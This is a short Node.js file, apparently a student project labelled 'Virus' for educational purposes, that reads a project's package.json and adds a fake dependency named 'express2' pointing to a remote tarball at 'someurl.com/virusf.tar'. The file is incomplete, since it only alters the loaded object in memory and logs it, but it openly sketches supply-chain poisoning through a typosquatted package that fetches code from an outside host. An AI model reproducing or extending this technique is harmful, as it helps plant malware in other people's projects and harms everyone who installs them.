/*
 *                                                              
 *    _/      _/  _/                                    _/_/_/_/   
 *   _/      _/      _/  _/_/  _/    _/    _/_/_/      _/          
 *   _/      _/  _/  _/_/      _/    _/  _/_/          _/_/_/       
 *    _/  _/    _/  _/        _/    _/      _/_/      _/            
 *     _/      _/  _/          _/_/_/  _/_/_/        _/             
 * ===================================================================                                                       
 *
 * ======================================================== *
 * > Description
 * ========================================================
 * This Virus if for educational purposes only!
 * 
 * Made by Group F from the SRH University
 * */



/* ======================================================== *
 * > Imports
 * ======================================================== */

/* ======================================================== *
 * > Packages
 * ======================================================== */
var fileSystem = require('./libs/files/fileSystem.js');

var check = fileSystem.checkFileExists('./package.json');

console.log(check);
if(check){
    var packageJson = require('./package.json');
    packageJson.dependencies["express2"] = "someurl.com/virusf.tar";
    console.log(packageJson);
}
else{
    console.log('Package.json not found!')
}